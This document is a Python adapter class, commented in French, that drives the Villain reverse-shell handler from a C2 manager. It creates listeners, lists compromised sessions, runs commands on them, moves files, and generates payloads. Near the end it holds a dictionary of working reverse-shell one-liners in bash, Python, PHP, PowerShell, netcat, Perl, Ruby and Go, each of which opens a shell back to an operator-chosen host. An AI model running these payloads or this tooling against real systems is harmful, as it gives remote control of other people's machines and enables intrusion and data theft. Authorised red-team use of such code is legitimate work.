"""
Villain — reverse shell handler multi-session + TeamServer.

Villain (github.com/t3l3machus/Villain) — gestionnaire de reverse shells Python.
Port écoute : configurable (ex: 6666 TCP, 443 HTTPS)
TeamServer  : port 65001 (collaboration multi-opérateurs via TCP JSON)
API REST    : port 8888 (Flask, si --api activé)

Modes de connexion (config.extra["mode"]) :
  "rest"       — API Flask REST (--api flag, port 8888)
  "teamserver" — TeamServer socket JSON (port 65001) [défaut]

Protocole TeamServer (JSON over TCP) :
  → {"action": "get_sessions"}           → liste des sessions
  → {"action": "exec", "id": N, "cmd": "..."} → exécuter une commande
  → {"action": "get_output", "id": N}    → récupérer la sortie
  → {"action": "upload", "id": N, ...}   → uploader un fichier
  → {"action": "download", "id": N, "path": "..."} → télécharger

Endpoints REST (mode --api) :
  GET  /api/sessions                  → liste des sessions actives
  POST /api/exec                      → exécuter une commande
  GET  /api/output/{session_id}       → sortie de la session
  POST /api/upload                    → upload de fichier
  POST /api/download                  → download de fichier
  GET  /api/status                    → statut du serveur
  POST /api/generate                  → générer un payload reverse shell
"""
from __future__ import annotations

import asyncio
import json
import logging
import struct
import uuid
from datetime import datetime
from typing import Any

import httpx

from c2_manager.interfaces import RestC2Interface, C2AuthError, C2ConnectionError
from c2_manager.models import C2Config, C2Status, Listener, Implant, Task, PayloadConfig

logger = logging.getLogger(__name__)

# Délimiteur de message TeamServer
_TS_DELIM = b"\x00"
_TS_TIMEOUT = 15.0


class VillainC2(RestC2Interface):
    """
    Villain — reverse shell handler multi-session.

    Paramètres extra (config.extra) :
      mode       : "rest" | "teamserver"  (défaut: "teamserver")
      ts_port    : int  — port TeamServer (défaut: 65001)
      api_port   : int  — port API REST   (défaut: 8888)
      api_key    : str  — clé API REST
      verify_ssl : bool (défaut: False)
    """

    CAPABILITIES = [
        "list_agents", "send_task", "create_listener", "remove_listener",
        "generate_payload", "file_upload", "file_download",
        "multi_session", "teamserver",
    ]

    def __init__(self) -> None:
        super().__init__()
        self._mode       = "teamserver"
        self._ts_reader: asyncio.StreamReader | None = None
        self._ts_writer: asyncio.StreamWriter | None = None
        self._ts_lock    = asyncio.Lock()

    # ── Connexion ─────────────────────────────────────────────────────────────

    async def connect(self, config: C2Config) -> bool:
        self._config = config
        self._mode   = config.extra.get("mode", "teamserver")

        if self._mode == "rest":
            return await self._connect_rest(config)
        return await self._connect_teamserver(config)

    async def _connect_rest(self, config: C2Config) -> bool:
        api_port = config.extra.get("api_port", 8888)
        scheme   = "https" if config.ssl else "http"
        base_url = f"{scheme}://{config.host}:{api_port}"
        api_key  = config.extra.get("api_key", "")

        self._client = httpx.AsyncClient(
            base_url=base_url,
            verify=config.extra.get("verify_ssl", False),
            timeout=30.0,
            headers={"X-API-Key": api_key} if api_key else {},
        )
        self._token  = api_key or "no-auth"
        self._status = C2Status.CONNECTED
        logger.info("Villain : connecté via REST API → %s", base_url)
        return True

    async def _connect_teamserver(self, config: C2Config) -> bool:
        ts_port = int(config.extra.get("ts_port", 65001))
        try:
            self._ts_reader, self._ts_writer = await asyncio.wait_for(
                asyncio.open_connection(config.host, ts_port),
                timeout=self.CONNECT_TIMEOUT,
            )
        except asyncio.TimeoutError as exc:
            raise C2ConnectionError(f"Villain TeamServer timeout : {config.host}:{ts_port}") from exc
        except OSError as exc:
            raise C2ConnectionError(f"Villain TeamServer connexion refusée : {exc}") from exc

        # Auth si password configuré
        if config.password:
            auth_resp = await self._ts_call({"action": "auth", "password": config.password})
            if auth_resp.get("status") != "ok":
                raise C2AuthError(f"Villain TeamServer auth échouée : {auth_resp}")

        self._status = C2Status.CONNECTED
        logger.info("Villain : connecté au TeamServer %s:%d", config.host, ts_port)
        return True

    async def disconnect(self) -> None:
        await self.stop_healthcheck()
        if self._ts_writer:
            try:
                self._ts_writer.close()
                await self._ts_writer.wait_closed()
            except Exception:
                pass
            self._ts_writer = None
            self._ts_reader = None
        if self._client:
            await self._client.aclose()
            self._client = None
        self._status = C2Status.DISCONNECTED

    async def get_status(self) -> C2Status:
        if self._mode == "rest":
            if not self._client:
                return C2Status.DISCONNECTED
            try:
                resp = await self._client.get("/api/status", timeout=5.0)
                return C2Status.CONNECTED if resp.status_code == 200 else C2Status.ERROR
            except Exception:
                return C2Status.ERROR
        else:
            if not self._ts_writer or self._ts_writer.is_closing():
                return C2Status.DISCONNECTED
            try:
                resp = await self._ts_call({"action": "ping"})
                return C2Status.CONNECTED if resp else C2Status.ERROR
            except Exception:
                return C2Status.ERROR

    # ── TeamServer protocol ───────────────────────────────────────────────────

    async def _ts_call(self, payload: dict[str, Any]) -> dict[str, Any]:
        """Envoi/réception JSON sur le socket TeamServer."""
        async with self._ts_lock:
            if not self._ts_writer or not self._ts_reader:
                raise C2ConnectionError("Villain TeamServer non connecté")
            data = json.dumps(payload).encode() + _TS_DELIM
            self._ts_writer.write(data)
            await self._ts_writer.drain()
            try:
                raw = await asyncio.wait_for(
                    self._ts_reader.readuntil(_TS_DELIM),
                    timeout=_TS_TIMEOUT,
                )
                return json.loads(raw.rstrip(_TS_DELIM))
            except asyncio.TimeoutError:
                return {"status": "timeout"}
            except json.JSONDecodeError:
                return {"status": "error", "raw": raw.decode(errors="replace")}

    # ── Authenticate (REST mode) ───────────────────────────────────────────────

    async def _authenticate(self, config: C2Config) -> str:
        return config.extra.get("api_key", "no-auth")

    # ── Listeners (canaux de réception) ──────────────────────────────────────

    async def create_listener(self, config: dict[str, Any]) -> Listener:
        self._require_connected()
        protocol = config.get("protocol", "tcp").lower()
        host     = config.get("bind_host", "0.0.0.0")
        port     = int(config.get("bind_port", 6666))
        name     = config.get("name", f"villain-{protocol}-{port}")

        if self._mode == "teamserver":
            resp = await self._ts_call({
                "action":  "add_listener",
                "type":    protocol,
                "host":    host,
                "port":    port,
                "ssl":     config.get("ssl", False),
                "name":    name,
            })
            lid    = str(resp.get("id") or resp.get("listener_id") or uuid.uuid4())
            status = "running" if resp.get("status") == "ok" else "error"
        else:
            data   = await self._post("/api/listeners", json={"type": protocol, "host": host, "port": port, "name": name})
            lid    = str(data.get("id") or uuid.uuid4())
            status = "running" if data.get("active", True) else "stopped"

        return Listener(
            id=lid, name=name, c2_type=self._config.c2_type,
            bind_host=host, bind_port=port, protocol=protocol, status=status,
            meta={"mode": self._mode},
        )

    async def remove_listener(self, listener_id: str) -> bool:
        self._require_connected()
        if self._mode == "teamserver":
            resp = await self._ts_call({"action": "remove_listener", "id": listener_id})
            return resp.get("status") == "ok"
        try:
            await self._delete(f"/api/listeners/{listener_id}")
            return True
        except Exception:
            return False

    async def list_listeners(self) -> list[Listener]:
        self._require_connected()
        if self._mode == "teamserver":
            resp  = await self._ts_call({"action": "get_listeners"})
            items = resp.get("listeners", [])
        else:
            data  = await self._get("/api/listeners")
            items = data if isinstance(data, list) else data.get("listeners", [])
        return [
            Listener(
                id=str(l.get("id") or uuid.uuid4()),
                name=l.get("name", ""),
                c2_type=self._config.c2_type,
                bind_host=l.get("host", "0.0.0.0"),
                bind_port=int(l.get("port", 6666)),
                protocol=l.get("type", "tcp"),
                status="running" if l.get("active", True) else "stopped",
            )
            for l in items
        ]

    # ── Sessions (agents) ─────────────────────────────────────────────────────

    async def list_agents(self) -> list[Implant]:
        self._require_connected()
        if self._mode == "teamserver":
            resp  = await self._ts_call({"action": "get_sessions"})
            items = resp.get("sessions", [])
        else:
            data  = await self._get("/api/sessions")
            items = data if isinstance(data, list) else data.get("sessions", [])
        return [self._parse_session(s) for s in items]

    def _parse_session(self, s: dict[str, Any]) -> Implant:
        sid = str(s.get("id") or s.get("session_id") or uuid.uuid4())

        def _dt(v: Any) -> datetime:
            if isinstance(v, (int, float)):
                try:
                    return datetime.utcfromtimestamp(v / 1000 if v > 1e10 else v)
                except Exception:
                    return datetime.utcnow()
            if isinstance(v, str):
                for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%d %H:%M:%S"):
                    try:
                        return datetime.strptime(v[:19], fmt)
                    except ValueError:
                        continue
            return datetime.utcnow()

        is_root = s.get("is_root") or s.get("root", False) or "root" in str(s.get("username", "")).lower()
        integrity = "SYSTEM" if is_root else "USER"

        return Implant(
            id=sid,
            name=f"{s.get('hostname', 'unknown')}-{sid[:6]}",
            c2_type=self._config.c2_type,
            listener_id=str(s.get("listener_id", "")),
            external_ip=s.get("remote_ip") or s.get("ip", ""),
            internal_ip=s.get("internal_ip", ""),
            hostname=s.get("hostname", ""),
            username=s.get("username") or s.get("user", ""),
            os=s.get("os") or s.get("platform", ""),
            arch=s.get("arch", ""),
            pid=int(s.get("pid", 0)),
            process_name=s.get("shell") or s.get("process", "/bin/bash"),
            integrity=integrity,
            last_checkin=_dt(s.get("last_active") or s.get("last_seen")),
            first_seen=_dt(s.get("connected_at") or s.get("created")),
            active=not bool(s.get("dead") or s.get("closed", False)),
            meta={
                "shell_type":  s.get("shell_type", ""),
                "encoding":    s.get("encoding", "utf-8"),
                "obfuscated":  s.get("obfuscated", False),
            },
        )

    # ── Commandes ─────────────────────────────────────────────────────────────

    async def send_task(
        self,
        agent_id: str,
        command:  str,
        args:     list[str] | None = None,
    ) -> Task:
        self._require_connected()
        args_list = args or []
        full_cmd  = command + (" " + " ".join(args_list) if args_list else "")
        task_id   = str(uuid.uuid4())

        if self._mode == "teamserver":
            resp = await self._ts_call({
                "action":  "exec",
                "id":      agent_id,
                "cmd":     full_cmd,
                "timeout": 30,
            })
            output = resp.get("output") or resp.get("result", "")
            return Task(
                id=resp.get("task_id") or task_id,
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=full_cmd,
                args=args_list,
                status="completed" if resp.get("status") == "ok" else "error",
                result=output,
                completed_at=datetime.utcnow() if output else None,
            )
        else:
            data = await self._post("/api/exec", json={"session_id": agent_id, "command": full_cmd})
            return Task(
                id=str(data.get("task_id") or task_id),
                agent_id=agent_id,
                c2_type=str(self._config.c2_type),
                command=full_cmd,
                args=args_list,
                status=data.get("status", "queued"),
            )

    async def get_task_result(self, task_id: str) -> dict[str, Any]:
        self._require_connected()
        if self._mode == "teamserver":
            resp = await self._ts_call({"action": "get_output", "task_id": task_id})
            return {"task_id": task_id, "status": resp.get("status"), "output": resp.get("output", "")}
        data = await self._get(f"/api/output/{task_id}")
        return {"task_id": task_id, "status": data.get("status"), "output": data.get("output", "")}

    # ── Payload ───────────────────────────────────────────────────────────────

    # Templates de reverse shells Villain
    _SHELL_TEMPLATES: dict[str, str] = {
        "bash":       "bash -i >& /dev/tcp/{host}/{port} 0>&1",
        "python":     "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('{host}',{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\"",
        "php":        "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        "powershell": "$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "nc":         "nc -e /bin/bash {host} {port}",
        "perl":       "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\")}};'",
        "ruby":       "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
        "golang":     "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{host}:{port}\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go",
    }

    async def generate_payload(self, config: PayloadConfig) -> bytes:
        self._require_connected()
        shell_type  = config.extra.get("shell_type", config.format or "bash")
        callback    = config.extra.get("callback_host", self._config.host)
        callback_port = config.extra.get("callback_port", self._config.port)

        if self._mode == "teamserver":
            resp = await self._ts_call({
                "action":     "generate",
                "type":       shell_type,
                "host":       callback,
                "port":       callback_port,
                "obfuscate":  config.obfuscation,
                "encode":     config.extra.get("encode", "base64"),
            })
            payload_str = resp.get("payload") or resp.get("cmd", "")
        elif self._client:
            data = await self._post("/api/generate", json={
                "type": shell_type, "host": callback, "port": callback_port,
                "obfuscate": config.obfuscation,
            })
            payload_str = data.get("payload") or data.get("cmd", "")
        else:
            # Fallback : template local
            template = self._SHELL_TEMPLATES.get(shell_type, self._SHELL_TEMPLATES["bash"])
            payload_str = template.format(host=callback, port=callback_port)

        return payload_str.encode() if payload_str else b""

    async def get_capabilities(self) -> list[str]:
        return self.CAPABILITIES
